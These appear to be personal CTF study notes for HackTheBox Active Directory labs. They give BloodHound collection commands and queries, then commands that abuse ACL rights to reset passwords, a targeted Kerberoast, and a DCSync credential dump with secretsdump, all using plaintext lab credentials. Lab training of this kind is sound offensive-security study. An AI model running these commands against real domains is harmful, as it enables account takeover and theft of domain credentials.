On target:
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All
```
or run remotely:
```
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```
or
```
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```
or use nxc:
```
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

 then start neo4j
- `sudo neo4j console`
- neo4j:(kali pw)
- `bloodhound`
- run command from another terminal tab
- clear database
- upload Data

#### Queries
```
MATCH (m:Computer) RETURN m
```
- see computers
```
MATCH (m:User) RETURN m
```
- see users
- marked any users with creds as "owned"
	- check owned users for OUTBOUND OBJECT CONTROL > First Degree Object Control
		- Looking for GenericAll, GenericWrite, ForceChangePassword
			- create potential attack path (ex: olivia has GenericAll over Michael & Michael has ForceChangePassword over Benjamin = probably worth checking out)
#### If user (Olivia) has GenericAll permissions over another user (Michael)
```
net user Michael Password123
```
- Change benjamin's password if currently owned user has GenericAll over benjamin
	- then login as that user and spray all open services with new creds
- can also use bloodyAD command below (if no shell)
#### If user (Michael) has ForceChangePassword over another user (Benjamin)
```
bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```
- using succesfully authenticated creds of michael to reset Benjamin's password
#### If user (Emily) has GenericWrite permissions over another user (Ethan)
- make sure IP is in `/etc/hosts` with all subdomains
```
sudo ntpdate administrator.htb
```
- syncs timezone for kerberos
- may need to run multiple times if below command fails:
```
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
- running this command with Emily will display the hash for Ethan
	- run john to crack the hash, then use pw below for secretsdump command
#### If user (Ethan) has DCsync over domain (dc.administrator.htb)
```
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```


